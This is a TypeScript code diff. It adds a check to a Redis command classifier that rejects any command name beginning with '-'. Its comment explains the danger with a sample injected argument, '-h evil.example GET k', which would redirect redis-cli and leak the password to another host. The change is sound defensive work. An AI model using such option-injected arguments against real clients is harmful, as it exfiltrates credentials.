@@ -483,6 +483,12 @@ const REDIS_BLOCKED: Record<string, string> = {
 export function classifyRedis(argv: string[]): Classification {
   const cmd = (argv[0] ?? '').toUpperCase();
   if (!cmd) return { class: 'read', kind: '', reasons: [], blocked: 'empty command' };
+  // redis-cli parses options until the first word that doesn't start with `-`
+  // and has no `--` terminator, so `-h evil.example GET k` would send the
+  // password to another host. A command name never starts with `-`.
+  if (cmd.startsWith('-')) {
+    return { class: 'destructive', kind: cmd, reasons: [], blocked: 'a Redis command never starts with "-" (the client would read it as one of its own options)' };
+  }
   const sub = (argv[1] ?? '').toUpperCase();
   const kind = ['OBJECT', 'MEMORY', 'SLOWLOG', 'XINFO', 'LATENCY', 'COMMAND', 'FUNCTION', 'SCRIPT', 'CLUSTER'].includes(cmd) && sub ? `${cmd} ${sub}` : cmd;
   if (REDIS_BLOCKED[cmd]) return { class: 'destructive', kind, reasons: [], blocked: REDIS_BLOCKED[cmd] };
